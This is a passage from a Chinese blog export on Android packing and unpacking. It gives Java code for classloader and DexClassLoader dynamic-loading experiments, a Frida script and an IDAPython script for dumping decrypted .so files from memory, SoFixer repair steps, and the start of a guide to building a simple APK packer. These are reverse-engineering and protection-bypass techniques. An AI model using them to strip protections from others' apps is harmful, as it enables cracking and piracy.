title=\"（1）验证类加载器\"></a>（1）验证类加载器</h4><p>我们验证App中的MainActivity类加载器和系统类String类的类加载器：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ClassLoader</span> <span class=\"variable\">thisclassloader</span> <span class=\"operator\">=</span> MainActivity.class.getClassLoader();</span><br><span class=\"line\"><span class=\"type\">ClassLoader</span> <span class=\"variable\">StringClassloader</span> <span class=\"operator\">=</span> String.class.getClassLoader();</span><br><span class=\"line\">Log.e(<span class=\"string\">&quot;ClassLoader1&quot;</span>,<span class=\"string\">&quot;MainActivity is in&quot;</span> + thisclassloader.toString());</span><br><span class=\"line\">Log.e(<span class=\"string\">&quot;ClassLoader1&quot;</span>,<span class=\"string\">&quot;String is in&quot;</span> + StringClassloader.toString());</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/19.png\" alt=\"image-20211010155539808\"></p>\n<p>我们可以明显发现<code>PathClassLoader</code>加载已安装的<code>APK</code>类加载器，而<code>BootClassLoader</code>加载系统预安装的类</p>\n<h4 id=\"（2）遍历父类加载器\"><a href=\"#（2）遍历父类加载器\" class=\"headerlink\" title=\"（2）遍历父类加载器\"></a>（2）遍历父类加载器</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span>  <span class=\"keyword\">void</span> <span class=\"title function_\">printClassLoader</span><span class=\"params\">(ClassLoader classLoader)</span> &#123;</span><br><span class=\"line\">       Log.e(<span class=\"string\">&quot;printClassLoader&quot;</span>,<span class=\"string\">&quot;this-&gt;&quot;</span>+ classLoader.toString());</span><br><span class=\"line\">       <span class=\"type\">ClassLoader</span> <span class=\"variable\">parent</span> <span class=\"operator\">=</span> classLoader.getParent();</span><br><span class=\"line\">       <span class=\"keyword\">while</span> (parent!=<span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">           Log.i(<span class=\"string\">&quot;printClassLoader&quot;</span>,<span class=\"string\">&quot;parent-&gt;&quot;</span>+parent.toString());</span><br><span class=\"line\">           parent = parent.getParent();</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）验证双亲委派机制\"><a href=\"#（3）验证双亲委派机制\" class=\"headerlink\" title=\"（3）验证双亲委派机制\"></a>（3）验证双亲委派机制</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">Class</span> <span class=\"variable\">StringClass</span> <span class=\"operator\">=</span> thisclassloader.loadClass(<span class=\"string\">&quot;java.lang.String&quot;</span>);</span><br><span class=\"line\">            Log.e(<span class=\"string\">&quot;ClassLoader1&quot;</span>,<span class=\"string\">&quot;load StringClass!&quot;</span>+thisclassloader.toString());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">            Log.e(<span class=\"string\">&quot;ClassLoader1&quot;</span>,<span class=\"string\">&quot;load MainActivity fail!&quot;</span>+thisclassloader.toString());</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们使用<code>PathClassLoader</code>去加载 String.class类，还是可以加载成功，因为双亲委派的机制</p>\n<h4 id=\"（4）动态加载\"><a href=\"#（4）动态加载\" class=\"headerlink\" title=\"（4）动态加载\"></a>（4）动态加载</h4><p>这里我借用网上寒冰大佬动态加载的案例，来进一步讲述使用DexClassLoader类实现简单的动态加载插件dex，并验证ClassLoader的继承关系</p>\n<p>我们先编写一个测试类文件,然后生成dex文件</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/23.png\" alt=\"image-20220218192716863\"></p>\n<p>我们先将dex文件放到模拟器的sdcard&#x2F;下</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/%20images221203/21.png\" alt=\"image-20211010150449575\"></p>\n<p>我们新建一个程序，然后编写主程序的代码，并授权sd读取权限</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Context</span> <span class=\"variable\">appContext</span> <span class=\"operator\">=</span> <span class=\"built_in\">this</span>.getApplication();</span><br><span class=\"line\">testDexClassLoader(appContext,<span class=\"string\">&quot;/sdcard/classes.dex&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;uses-permission android:name=<span class=\"string\">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br><span class=\"line\">&lt;uses-permission android:name=<span class=\"string\">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>\n\n<p>然后我们编写类加载器代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">testDexClassLoader</span><span class=\"params\">(Context context, String dexfilepath)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">//构建文件路径：/data/data/com.emaxple.test02/app_opt_dex，存放优化后的dex,lib库</span></span><br><span class=\"line\">        <span class=\"type\">File</span> <span class=\"variable\">optfile</span> <span class=\"operator\">=</span> context.getDir(<span class=\"string\">&quot;opt_dex&quot;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"type\">File</span> <span class=\"variable\">libfile</span> <span class=\"operator\">=</span> context.getDir(<span class=\"string\">&quot;lib_dex&quot;</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"type\">ClassLoader</span> <span class=\"variable\">parentclassloader</span> <span class=\"operator\">=</span> MainActivity.class.getClassLoader();</span><br><span class=\"line\">        <span class=\"type\">ClassLoader</span> <span class=\"variable\">tmpclassloader</span> <span class=\"operator\">=</span> context.getClassLoader();</span><br><span class=\"line\">    <span class=\"comment\">//可以为DexClassLoader指定父类加载器</span></span><br><span class=\"line\">        <span class=\"type\">DexClassLoader</span> <span class=\"variable\">dexClassLoader</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DexClassLoader</span>(dexfilepath,optfile.getAbsolutePath(),libfile.getAbsolutePath(),parentclassloader);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">clazz</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            clazz = dexClassLoader.loadClass(<span class=\"string\">&quot;com.example.test.TestClass&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(clazz!=<span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"type\">Method</span> <span class=\"variable\">testFuncMethod</span> <span class=\"operator\">=</span> clazz.getDeclaredMethod(<span class=\"string\">&quot;test02&quot;</span>);</span><br><span class=\"line\">                <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> clazz.newInstance();</span><br><span class=\"line\">                testFuncMethod.invoke(obj);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (IllegalAccessException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InstantiationException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InvocationTargetException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（5）获得类列表\"><a href=\"#（5）获得类列表\" class=\"headerlink\" title=\"（5）获得类列表\"></a>（5）获得类列表</h4><p>我们通过getClassNameList来获取类列表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">private static native String[] getClassNameList(Object cookie);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">getClassListInClassLoader</span><span class=\"params\">(ClassLoader classLoader)</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//先拿到BaseDexClassLoader</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//拿到pathList</span></span><br><span class=\"line\">            <span class=\"type\">Class</span> <span class=\"variable\">BaseDexClassLoader</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;dalvik.system.BaseDexClassLoader&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">Field</span> <span class=\"variable\">pathListField</span> <span class=\"operator\">=</span> BaseDexClassLoader.getDeclaredField(<span class=\"string\">&quot;pathList&quot;</span>);</span><br><span class=\"line\">            pathListField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            <span class=\"type\">Object</span> <span class=\"variable\">pathListObj</span> <span class=\"operator\">=</span> pathListField.get(classLoader);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//拿到dexElements</span></span><br><span class=\"line\">            <span class=\"type\">Class</span> <span class=\"variable\">DexElementClass</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;dalvik.system.DexPathList&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">Field</span> <span class=\"variable\">DexElementFiled</span> <span class=\"operator\">=</span> DexElementClass.getDeclaredField(<span class=\"string\">&quot;dexElements&quot;</span>);</span><br><span class=\"line\">            DexElementFiled.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            Object[]  dexElementObj = (Object[]) DexElementFiled.get(pathListObj);</span><br><span class=\"line\">            <span class=\"comment\">//拿到dexFile</span></span><br><span class=\"line\">            <span class=\"type\">Class</span> <span class=\"variable\">Element</span> <span class=\"operator\">=</span> Class.forName(<span class=\"string\">&quot;dalvik.system.DexPathList$Element&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">Field</span> <span class=\"variable\">dexFileField</span> <span class=\"operator\">=</span> Element.getDeclaredField(<span class=\"string\">&quot;dexFile&quot;</span>);</span><br><span class=\"line\">            dexFileField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            <span class=\"type\">Class</span> <span class=\"variable\">DexFile</span> <span class=\"operator\">=</span>Class.forName(<span class=\"string\">&quot;dalvik.system.DexFile&quot;</span>);</span><br><span class=\"line\">            <span class=\"type\">Field</span> <span class=\"variable\">mCookieField</span> <span class=\"operator\">=</span> DexFile.getDeclaredField(<span class=\"string\">&quot;mCookie&quot;</span>);</span><br><span class=\"line\">            mCookieField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            <span class=\"type\">Field</span> <span class=\"variable\">mFiledNameField</span> <span class=\"operator\">=</span> DexFile.getDeclaredField(<span class=\"string\">&quot;mFileName&quot;</span>);</span><br><span class=\"line\">            mFiledNameField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            <span class=\"comment\">//拿到getClassNameList</span></span><br><span class=\"line\">            <span class=\"type\">Method</span> <span class=\"variable\">getClassNameListMethod</span> <span class=\"operator\">=</span> DexFile.getDeclaredMethod(<span class=\"string\">&quot;getClassNameList&quot;</span>,Object.class);</span><br><span class=\"line\">            getClassNameListMethod.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">for</span>(Object dexElement:dexElementObj)&#123;</span><br><span class=\"line\">                <span class=\"type\">Object</span> <span class=\"variable\">dexfileObj</span> <span class=\"operator\">=</span> dexFileField.get(dexElement);</span><br><span class=\"line\">                <span class=\"type\">Object</span> <span class=\"variable\">mCookiedobj</span> <span class=\"operator\">=</span> mCookieField.get(dexfileObj);</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">mFileNameobj</span> <span class=\"operator\">=</span> (String) mFiledNameField.get(dexfileObj);</span><br><span class=\"line\">                String[] classlist = (String[]) getClassNameListMethod.invoke(<span class=\"literal\">null</span>,mCookiedobj);</span><br><span class=\"line\">                <span class=\"keyword\">for</span>(String classname:classlist)&#123;</span><br><span class=\"line\">                    Log.e(<span class=\"string\">&quot;classlist&quot;</span>,classLoader.toString()+<span class=\"string\">&quot;-----&quot;</span>+mFileNameobj+<span class=\"string\">&quot;-----&quot;</span>+classname);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (NoSuchFieldException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IllegalAccessException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InvocationTargetException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、实验总结\"><a href=\"#三、实验总结\" class=\"headerlink\" title=\"三、实验总结\"></a>三、实验总结</h2><p>花了一段时间，断断续续总算把这篇类加载器和动态加载的帖子写完了，从中学习到了很多，这里如果有什么错误，就请各位大佬指正了。</p>\n<h2 id=\"四、参考文献\"><a href=\"#四、参考文献\" class=\"headerlink\" title=\"四、参考文献\"></a>四、参考文献</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://gityuan.com/2017/03/19/android-classloader/</span><br><span class=\"line\">https://www.jianshu.com/p/7193600024e7</span><br><span class=\"line\">https://www.jianshu.com/p/ff489696ada2</span><br><span class=\"line\">https://www.jianshu.com/p/363a4ad0489d</span><br><span class=\"line\">https://github.com/huanzhiyazi/articles/issues/30</span><br><span class=\"line\">https://juejin.cn/post/6844903940094427150#heading-12</span><br></pre></td></tr></table></figure>\n\n","categories":["Android加壳与脱壳"],"tags":["逆向技术","加壳与脱壳"]},{"title":"Android加壳与脱壳（10）—— （so脱壳）自解密的脱壳修复","url":"/2023/01/19/Packer10/","content":"<h2 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1.前言\"></a>1.前言</h2><p>本文简单介绍一些so文件简单的内存dump和修复的一些流程，主要针对so脱壳中自解密的应对方案</p>\n<span id=\"more\"></span>\n\n<h2 id=\"2-实验\"><a href=\"#2-实验\" class=\"headerlink\" title=\"2.实验\"></a>2.实验</h2><h3 id=\"2-1-So固技术简要分析\"><a href=\"#2-1-So固技术简要分析\" class=\"headerlink\" title=\"2.1 So固技术简要分析\"></a>2.1 So固技术简要分析</h3><p>我们在分析Android应用时，最后往往会分析到so层，而so层的防护手段有很多，一般分为有源保护和无源保护，有源保护分为自解密、混淆、源码VMP等，无源保护分为加壳、VMP保护。 </p>\n<p><strong>自解密的有源保护</strong></p>\n<p>自解密保护往往是通过对函数或段进行加密，然后再加载SO文件，解密之前加密的函数和段，由于应用程序在运行后要解密相关的逻辑，所以往往只需要在SO文件运行后，进行Dump后，就可以获取解密后的逻辑，破解难度较低</p>\n<h3 id=\"2-2-实验样本分析\"><a href=\"#2-2-实验样本分析\" class=\"headerlink\" title=\"2.2 实验样本分析\"></a>2.2 实验样本分析</h3><p>我们在分析so文件时，经常会遇到各种防护，最简单的一种防护就是自解密保护，一般这种通过对函数段进行加密，会对一些数据段加密处理，例如下面我们打开一个样本</p>\n<p><img src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer10/image-20230106143608705.png\" alt=\"image-20230106143608705\"></p>\n<p>我们可以很清晰的发现加密的函数datadiv_decode，在<a href=\"https://bbs.kanxue.com/thread-273867.htm\">Android APP漏洞之战（13）——WebView漏洞详解</a>介绍了很多的工具，包括一些手段，这里我们通过<code>ctrl+s</code>可以进一步查看程序的各部分</p>\n<p><img src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer10/image-20230106143816405.png\" alt=\"image-20230106143816405\"></p>\n<p>我们查看数据段，可以发现函数名等明显被加密了，很明显也是调用datadiv_decode函数进行处理的</p>\n<p><img src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer10/image-20230106143917895.png\" alt=\"image-20230106143917895\"></p>\n<p>针对这种情况，我们可以直接编写so dump脚本，在程序运行后这些函数自然就解密完成，然后我们进行dump内存中的so文件就可以得到一个解密后的so文件</p>\n<h3 id=\"2-3-so-dump脚本编写\"><a href=\"#2-3-so-dump脚本编写\" class=\"headerlink\" title=\"2.3 so_dump脚本编写\"></a>2.3 so_dump脚本编写</h3><p>so的dump脚本如下所示：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">so_dump</span>(<span class=\"params\">so_name</span>)&#123;</span><br><span class=\"line\">    <span class=\"title class_\">Java</span>.<span class=\"title function_\">perform</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> <span class=\"variable language_\">module</span> = <span class=\"title class_\">Process</span>.<span class=\"title function_\">getModuleByName</span>(so_name);</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;[name]:&quot;</span>,<span class=\"variable language_\">module</span>.<span class=\"property\">name</span>);</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;[base]:&quot;</span>,<span class=\"variable language_\">module</span>.<span class=\"property\">base</span>);</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;[size]:&quot;</span>,<span class=\"variable language_\">module</span>.<span class=\"property\">size</span>);</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;[path]:&quot;</span>,<span class=\"variable language_\">module</span>.<span class=\"property\">path</span>);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> currentApplication = <span class=\"title class_\">Java</span>.<span class=\"title function_\">use</span>(<span class=\"string\">&quot;android.app.ActivityThread&quot;</span>).<span class=\"title function_\">currentApplication</span>();</span><br><span class=\"line\">        <span class=\"keyword\">var</span> dir = currentApplication.<span class=\"title function_\">getApplicationContext</span>().<span class=\"title function_\">getFilesDir</span>().<span class=\"title function_\">getPath</span>();</span><br><span class=\"line\">        <span class=\"keyword\">var</span> path = dir + <span class=\"string\">&quot;/&quot;</span> + <span class=\"variable language_\">module</span>.<span class=\"property\">name</span> +<span class=\"string\">&quot;_&quot;</span>+<span class=\"variable language_\">module</span>.<span class=\"property\">base</span> + <span class=\"string\">&quot;_&quot;</span> + <span class=\"variable language_\">module</span>.<span class=\"property\">size</span> + <span class=\"string\">&quot;.so&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> file = <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(path,<span class=\"string\">&quot;wb&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(file)&#123;</span><br><span class=\"line\">            <span class=\"title class_\">Memory</span>.<span class=\"title function_\">protect</span>(<span class=\"variable language_\">module</span>.<span class=\"property\">base</span>,<span class=\"variable language_\">module</span>.<span class=\"property\">size</span>,<span class=\"string\">&#x27;rwx&#x27;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">var</span> buffer = <span class=\"variable language_\">module</span>.<span class=\"property\">base</span>.<span class=\"title function_\">readByteArray</span>(<span class=\"variable language_\">module</span>.<span class=\"property\">size</span>);</span><br><span class=\"line\">            file.<span class=\"title function_\">write</span>(buffer);</span><br><span class=\"line\">            file.<span class=\"title function_\">flush</span>();</span><br><span class=\"line\">            file.<span class=\"title function_\">close</span>();</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&quot;[dump success:]&quot;</span>+path);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>就是从内存中搜索目标的so文件，然后进行dump，此时往往加密的函数都进行解密了</p>\n<p>然后此时我们使用frida注入该脚本，就可以dump下内存中的so文件，再次打开，发现一些段丢失，这是因为内存中的so文件需要进行修复</p>\n<p><img src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer10/image-20230106150723060.png\" alt=\"image-20230106150723060\"></p>\n<p><img src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer10/image-20230106150745491.png\" alt=\"image-20230106150745491\"></p>\n<p>明显发现一些数据IDA没有识别出来，这是因为IDA是按照ELF文件的section进行识别，然后我们需要进行修复</p>\n<p>还可以使用IDApython脚本，但需要知道起始地址和结束地址：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">import idaapi</span><br><span class=\"line\">start_address = <span class=\"number\">0x0000007DB078B000</span></span><br><span class=\"line\">end_address = <span class=\"number\">0x0000007DB08DE000</span></span><br><span class=\"line\">data_length = end_address - start_address</span><br><span class=\"line\">fp = open(<span class=\"string\">&#x27;E:\\path.so&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">cur = <span class=\"number\">0</span></span><br><span class=\"line\">towrite = <span class=\"number\">0x100000</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> cur &lt; data_length:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> data_length - cur &lt; <span class=\"number\">0x100000</span>:</span><br><span class=\"line\">        towrite = data_length - cur</span><br><span class=\"line\">    data = idaapi.dbg_read_memory(start_address + cur, towrite)</span><br><span class=\"line\">    fp.write(data)</span><br><span class=\"line\">    cur = cur + towrite</span><br><span class=\"line\"></span><br><span class=\"line\">fp.close()</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-4-So文件的修复\"><a href=\"#2-4-So文件的修复\" class=\"headerlink\" title=\"2.4 So文件的修复\"></a>2.4 So文件的修复</h3><p>这里可以使用网上的开源工具SoFixer:<a href=\"https://github.com/F8LEFT/SoFixer\">https://github.com/F8LEFT/SoFixer</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sofixer  -s soruce.so -o fix.so -m 0x0 -d </span><br><span class=\"line\">-s 待修复的so路徑</span><br><span class=\"line\">-o 修复后的so路徑</span><br><span class=\"line\">-m 內存dump的基地址(16位) 0xABC</span><br><span class=\"line\">-d 输出debug信息</span><br></pre></td></tr></table></figure>\n\n<p>然后打开修复后的so文件</p>\n<p><img src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer10/image-20230106151410030.png\" alt=\"image-20230106151410030\"></p>\n<p>此时一些的函数段已经修复完成，然后再次查看数据段部分</p>\n<p><img src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer10/image-20230106151441598.png\" alt=\"image-20230106151441598\"></p>\n<p>可以发现现在数据段加密部分全部已经解密完成，这里简单演示自解密so防护的dump和修复</p>\n<p>当然感兴趣朋友自己也可以将dump和修复写成一个脚本，网上也有一些开源的脚本，如下所示：</p>\n<p><a href=\"https://github.com/lasting-yang/frida_dump\">https://github.com/lasting-yang/frida_dump</a></p>\n<p><img src=\"https://packer-1307040378.cos.ap-chengdu.myqcloud.com/packer10/image-20230106151725990.png\" alt=\"image-20230106151725990\"></p>\n<p>可以快速的进行dump和修复</p>\n<h2 id=\"3-总结\"><a href=\"#3-总结\" class=\"headerlink\" title=\"3.总结\"></a>3.总结</h2><p>今天简单介绍了一下so加固中自解密加固方式的脱壳和修复技巧，后续将进一步讲解so加固的其他方式的应对方案，样本上传到知识星球，感兴趣朋友前往下载</p>\n","categories":["Android加壳与脱壳"],"tags":["逆向技术","加壳与脱壳"]},{"title":"Android加壳与脱壳（2）——制作简易的第一代加壳机","url":"/2022/12/04/Packer2/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>前面我在看雪论坛上发表的两篇文章都讲解了第一代壳的加壳原理和脱壳原理</p>\n<span id=\"more\"></span>\n\n<p><a href=\"https://bbs.pediy.com/thread-271538.htm\">Android加壳脱壳学习（1）——动态加载和类加载机制详解</a></p>\n<p>但是不少朋友仍然私信说有没有完整的项目,由于最近一直很忙，就没有从头实现一个简易的第一代壳加壳机，恰好最近看见看雪有大佬的一篇文章<a href=\"https://bbs.pediy.com/thread-273880.htm#msg_header_h2_2\">Android 简单加密壳</a>,这篇文章很详细的讲解的整体加壳的原理和实现的思路，于是我进行了编译了源码，而其中发现签名有一点问题，并进行了小小优化，然后打包提供给大家使用</p>\n<p>源项目地址：<a href=\"https://github.com/overturncat/reverse_android/tree/master/ApkPacker\">https://github.com/overturncat/reverse_android/tree/master/ApkPacker</a></p>\n<p>修改后的项目地址：github后续上传</p>\n<h2 id=\"二、原理解析\"><a href=\"#二、原理解析\" class=\"headerlink\" title=\"二、原理解析\"></a>二、原理解析</h2><p>前面的两篇文章，我已经很详细的讲解了第一代壳动态加载的原理，不清楚的可以先去阅读前面的两篇文章，下面我主要分析上作者项目的大致流程和结构</p>\n<p><strong>首先我们回顾一下动态加载整体加壳的实现流程：</strong></p>\n<p>（1）代理启动：APK首先启动壳程序的Application，在壳程序的Application中的<code>attachBaseContext</code>和<code>onCreate</code>中依次完成源程序的解密和动态加载</p>\n<p>（2）动态加载：壳Application中要完成classLoader的替换，然后用替换后的classLoader去加载源程序dex，就可以执行正常的代码</p>\n<p><strong>流程很简单，具体设计的步骤：</strong></p>\n<p>（1）制作壳dex代理类：负责完成解密和动态加密，如果源dex没有加密则不需要解密</p>\n<p>DummyApplication:</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/1.png\" alt=\"image-20221006194605283\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/2.png\" alt=\"image-20221006194634799\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/3.png\" alt=\"image-20221006194736932\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">功能：完成类加载器替换和动态加载</span><br></pre></td></tr></table></figure>\n\n<p>（2）使用apktool解压源程序</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/4.png\" alt=\"image-20221006194931223\"></p>\n<p>（3）修改源程序AndroidManifest中的Application为壳程序DummyApplication，即修改入口点</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/6.png\" alt=\"image-20221006195130104\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/7.png\" alt=\"image-20221006195205559\"></p>\n<p>（4）将源程序dex拷贝到asset下，用于后面动态加载</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/5.png\" alt=\"image-20221006195028375\"></p>\n<p>（5）删除源程序的smali文件夹，替换为壳程序Application的smali代码</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/8.png\" alt=\"image-20221006195348250\"></p>\n<p>这样就将源程序的smali代码全部替换为壳程序代码，而源程序源码保存在asset下，就可以用壳程序代码去动态加载源程序，实现简易加壳</p>\n<p>（6）然后重打包签名即可完成</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/9.png\" alt=\"image-20221006195557276\"></p>\n<p>补充一下：原作者的ApkPacker更新了两个版本，第二个版本主要是考虑源APK本身含有代理类Application的问题，然后进行了解决，大家可以查看源码</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/10.png\" alt=\"image-20221006195735199\"></p>\n<h2 id=\"三、使用\"><a href=\"#三、使用\" class=\"headerlink\" title=\"三、使用\"></a>三、使用</h2><p>其实理解了动态加载和加壳的原理，制作一个简易的加壳器是十分简单的，这里我编译时发现作者的签名会报错，然后对签名替换了一下，还优化了路径并进行打包，方便大家使用，最后的项目文件：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/11.png\" alt=\"image-20221006200007695\"></p>\n<p>sign是用于签名的，这里我进行了更改</p>\n<p>out是输出结果的文件夹，里面包含加壳后签名和未签名两类</p>\n<p>dummyDexSmli是壳程序，大家想制作自己的加壳器，这里自己可以参考作者的代码进行修改，比如还可以加解密等等</p>\n<p>使用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sh ApkPacker.sh apk路径</span><br><span 